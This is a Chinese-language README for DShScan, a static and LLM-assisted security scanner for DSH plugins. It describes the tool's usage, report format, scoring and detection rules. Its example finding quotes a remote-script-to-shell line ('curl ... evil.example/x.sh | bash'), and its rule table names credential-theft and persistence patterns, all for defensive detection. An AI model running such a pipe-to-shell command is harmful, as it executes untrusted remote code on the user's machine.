# DShScan

DSH 插件安全审查器（DShScan），模仿 NVIDIA SkillSpector 机制，为 dshbase.com 插件目录中的 DSH 插件提供风险评分、严重等级、证据清单和安装建议。

## 功能

- **输入**：插件名 / GitHub 仓库地址 / 本地目录 / zip / Markdown 文件
- **输出**：JSON 报告，包含 `risk_score`、`severity`、`safe_to_install`、`recommendation`、`findings`
- **双通道扫描**：
  - 静态规则扫描（完全离线）
  - 可选 LLM 语义扫描（需 API Key）
- **dshbase 集成**：输入插件名时自动读取本地索引元数据（stars / trust / verified / npm / cmd）
- **误报处理**：每条 finding 都带证据 + 修复建议

## 安装与构建

```bash
cd E:\workspace\deepseek\work\dshscan
npm install
npm run build
```

构建后生成 `dist/main.js`，可通过 `dshscan.cmd` 或 `node dist/main.js` 调用。

## 使用

```bash
# 扫描 dshbase 插件（按名称自动查索引，并尝试 clone 源码）
dshscan OpenViking
dshscan dsh-openviking

# 扫描 GitHub 仓库
dshscan github:volcengine/OpenViking
dshscan https://github.com/volcengine/OpenViking

# 扫描本地目录 / zip / md
dshscan E:\path\to\plugin
dshscan plugin.zip
dshscan README.md

# 仅离线扫描（不 clone 远程仓库，只给索引元数据 + 静态限制说明）
dshscan OpenViking --offline

# 启用 LLM 语义扫描（需要设置 DSCAN_LLM_API_KEY 或 OPENAI_API_KEY）
dshscan OpenViking --semantic

# 自定义 LLM 接入
dshscan OpenViking --semantic --llm-base-url https://api.openai.com/v1 --llm-model gpt-4o-mini

# 输出到文件
dshscan OpenViking --output report.json --pretty
```

## 环境变量

| 变量 | 用途 | 默认 |
|---|---|---|
| `DSCAN_INDEX` | dshbase 插件索引 JSON 路径 | 本机默认索引路径 |
| `DSCAN_LLM_API_KEY` | 语义扫描 API Key | 无（未设置则仅静态扫描） |
| `OPENAI_API_KEY` | 备选 API Key | 无 |
| `DSCAN_LLM_BASE_URL` | OpenAI 兼容接口地址 | `https://api.openai.com/v1` |
| `DSCAN_LLM_MODEL` | 语义分析模型 | `gpt-4o-mini` |

## JSON 报告格式

```json
{
  "tool": "DShScan",
  "version": "0.1.0",
  "target": {
    "kind": "plugin",
    "raw": "OpenViking",
    "displayName": "OpenViking",
    "repoUrl": "https://github.com/volcengine/OpenViking.git",
    "metadata": {
      "name": "OpenViking",
      "stars": 28734,
      "trust": "silver",
      "verified": true,
      "npm": false,
      "cmd": "dsh plugin add github:volcengine/OpenViking"
    }
  },
  "risk_score": 0,
  "severity": "low",
  "safe_to_install": true,
  "recommendation": "风险较低，可以安装；仍建议保持插件更新并定期复查。",
  "findings": [],
  "llm_used": false,
  "scan_mode": "static",
  "scan_note": "仅静态扫描，非完整扫描。",
  "metadata": {
    "name": "OpenViking",
    "stars": 28734,
    "trust": "silver",
    "verified": true,
    "npm": false,
    "cmd": "dsh plugin add github:volcengine/OpenViking"
  }
}
```

### finding 对象

```json
{
  "id": "R001",
  "severity": "critical",
  "category": "remote-code-execution",
  "title": "Remote script piped to shell",
  "evidence": "install.sh:12: curl -fsSL https://evil.example/x.sh | bash",
  "recommendation": "Remove remote-pipe-to-shell installers. Vendor the script, pin a checksum, and review before execution.",
  "source": "static",
  "rule": "R001"
}
```

### 严重等级与风险分

| risk_score | severity |
|---|---|
| 0–29 | low |
| 30–59 | medium |
| 60–79 | high |
| 80–100 | critical |

`safe_to_install` 为 `true` 仅当：没有 high/critical finding，且 `risk_score < 40`。

**计分方式**：每个类别只取最高严重级的权重（critical=50 / high=30 / medium=15 / low=5），
同一类别的重复命中（如 40 处 chmod）不叠加，类别间求和后封顶 100——避免噪音把分数顶满。

**上下文衰减**：命中在以下文件里会降一级严重级（文档/测试是描述性的，信号置信度低）：

- 文档（`.md` / `.markdown` / `.txt` / `.rst`）——R008（提示注入，本身针对文档）除外
- 测试代码（`test(s)/` 目录、`*.test.*`、`*_test.*`、`test_*`）
- 构建镜像（`Dockerfile*`、`docker-compose*.yml`）

以下目录完全不扫描：`.github` / `.circleci` / `.gitlab`、`third_party` / `vendor` 等 vendored 依赖、
`node_modules` / `dist` / `build` 等构建产物。

## 静态规则

| ID | 严重等级 | 类别 |
|---|---|---|
| R001 | critical | 远程脚本管道执行 |
| R002 | high | 动态代码执行（独立 `eval`、shell `eval "..."`、`new Function`、`vm` 逃逸、`os.system`、`child_process.exec`） |
| R002b | medium | `shell: true` / `shell=True`（单独出现的弱信号） |
| R003 | high | 混淆代码 |
| R004 | medium | HTTP 明文网络端点（排除模板插值、命名空间 URI、本地/示例域名） |
| R004b | medium | 硬编码公网 IP 回调（排除私网/环回段） |
| R005 | high | 凭据读取/窃取 |
| R006 | high | 持久化/提权（仅强信号：`chmod 777`、`systemctl enable`、注册表 Run 键、`schtasks`、`launchctl`、`crontab -e`、`--unsafe-perm`） |
| R007 | medium | 远程包安装源 |
| R008 | critical | README 提示注入 |
| R009 | medium/high | package.json 生命周期脚本 |
| M001–M004 | low/medium | 索引元数据风险信号 |
| E001–E005 | medium/high | 扫描限制/输入错误 |

## 测试

```bash
npm test
```

基于 Node 内置 test runner（`node --test`），覆盖规则命中/反例、上下文衰减、
计分封顶、路径分类与恶意样例端到端判定。

## 说明

- `verified=true` 仅表示 dshbase CI 可安装，不等于安全审计。
- 静态扫描无需网络；但扫描 GitHub 仓库时获取源码需要网络（可用 `--offline` 跳过）。
- 低风险但未启用语义扫描时，报告会标注 `scan_mode: "static"` 和 `"仅静态扫描，非完整扫描"`。
- 报告超过 100 条 finding 时只展示按严重级排序的前 100 条，并置 `findings_truncated: true`（计分与安装建议仍基于全量）。
- 索引文件缺失/损坏不会导致崩溃：自动降级为无元数据通道并提示（可用 `DSCAN_INDEX` 指向你自己的索引）。
